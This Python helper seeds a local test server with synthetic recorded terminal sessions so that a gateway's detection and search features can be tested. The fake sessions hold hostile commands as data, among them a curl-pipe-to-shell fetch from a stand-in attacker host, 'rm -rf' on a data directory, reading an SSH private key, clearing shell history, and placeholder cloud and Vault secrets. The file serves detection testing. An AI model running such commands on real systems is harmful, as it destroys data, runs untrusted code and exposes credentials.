"""Seed the local test container with sample Gateway recordings.

One-off helper for manual UI testing of search/detection. Posts a handful of
synthetic asciicast sessions (varied users, systems, dates, and finding mixes)
through the real /ingest front door, then sends a close event per session so each
finalizes immediately (no waiting on the idle timeout).

Not part of the app; safe to delete. Usage: python scripts/seed_demo.py
"""

from __future__ import annotations

import json
import urllib.request

BASE = "http://127.0.0.1:8080"
TOKEN = "test-ingest-token"


def cast(events: list[tuple[float, str]], width: int = 100, height: int = 30) -> str:
    """Build a minimal asciicast v2 document from (offset, output) tuples."""
    header = {"version": 2, "width": width, "height": height, "timestamp": 1718700000}
    lines = [json.dumps(header)]
    for offset, data in events:
        lines.append(json.dumps([offset, "o", data]))
    return "\n".join(lines) + "\n"


# (conn_id, username, resource_address, started_ts, [output events])
SESSIONS = [
    (
        "c-prod-db-01", "alice@corp", "prod-db-01", "2026-06-18T09:00:00Z",
        [
            (0.5, "alice@prod-db-01:~$ ls /var/lib\r\n"),
            (2.0, "alice@prod-db-01:~$ rm -rf /var/lib/data\r\n"),
            (6.5, "alice@prod-db-01:~$ export AWS_KEY=AKIAIOSFODNN7EXAMPLE\r\n"),
            (9.0, "alice@prod-db-01:~$ exit\r\n"),
        ],
    ),
    (
        "c-web-02", "bob@corp", "web-02", "2026-06-17T14:30:00Z",
        [
            (0.4, "bob@web-02:~$ whoami\r\nbob\r\n"),
            (3.2, "bob@web-02:~$ curl http://evil.example/i.sh | sh\r\n"),
            (12.0, "bob@web-02:~$ export VAULT_TOKEN=hvs.CAESIabcdef1234567890XYZ\r\n"),
            (15.0, "bob@web-02:~$ logout\r\n"),
        ],
    ),
    (
        "c-k8s-03", "carol@corp", "k8s-prod", "2026-06-16T11:00:00Z",
        [
            (1.0, "carol@k8s-prod:~$ kubectl get pods\r\n"),
            (4.5, "carol@k8s-prod:~$ kubectl delete deployment legacy-app\r\n"),
            (8.0, "carol@k8s-prod:~$ chmod 777 /opt/app/run.sh\r\n"),
            (11.0, "carol@k8s-prod:~$ exit\r\n"),
        ],
    ),
    (
        "c-jump-05", "dave@corp", "jump-host", "2026-06-15T16:00:00Z",
        [
            (0.6, "dave@jump-host:~$ cat ~/.ssh/id_rsa\r\n"),
            (1.0, "-----BEGIN OPENSSH PRIVATE KEY-----\r\n"),
            (1.2, "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA\r\n"),
            (1.4, "-----END OPENSSH PRIVATE KEY-----\r\n"),
            (5.0, "dave@jump-host:~$ history -c\r\n"),
            (7.0, "dave@jump-host:~$ exit\r\n"),
        ],
    ),
    (
        "c-bastion-04", "alice@corp", "bastion", "2026-06-18T08:00:00Z",
        [
            (0.5, "alice@bastion:~$ ls -la\r\ntotal 0\r\n"),
            (2.0, "alice@bastion:~$ whoami\r\nalice\r\n"),
            (4.0, "alice@bastion:~$ echo all good\r\nall good\r\n"),
            (5.5, "alice@bastion:~$ exit\r\n"),
        ],
    ),
]


def lines_for(session: tuple) -> list[dict]:
    """Build the start + chunk + close log objects for one session."""
    conn_id, username, resource, ts, events = session
    user = {"username": username, "id": username, "groups": ["engineering"]}
    return [
        {
            "logger": "gateway",
            "message": "Authenticated connection",
            "conn_id": conn_id,
            "resource_address": resource,
            "user": user,
            "ts": ts,
        },
        {
            "logger": "gateway.audit",
            "conn_id": conn_id,
            "asciicast": cast(events),
            "asciicast_sequence_num": 0,
            "user": user,
            "ts": ts,
        },
        {
            "logger": "gateway",
            "message": "Connection closed",
            "conn_id": conn_id,
            "ts": ts,
        },
    ]


def main() -> None:
    """Post all sample sessions to /ingest as one NDJSON batch."""
    objs: list[dict] = []
    for session in SESSIONS:
        objs.extend(lines_for(session))
    body = "\n".join(json.dumps(o) for o in objs).encode("utf-8")

    req = urllib.request.Request(
        f"{BASE}/ingest",
        data=body,
        method="POST",
        headers={
            "Authorization": f"Bearer {TOKEN}",
            "Content-Type": "application/x-ndjson",
        },
    )
    with urllib.request.urlopen(req) as resp:
        print(f"POST /ingest -> {resp.status} ({len(objs)} objects, {len(SESSIONS)} sessions)")


if __name__ == "__main__":
    main()
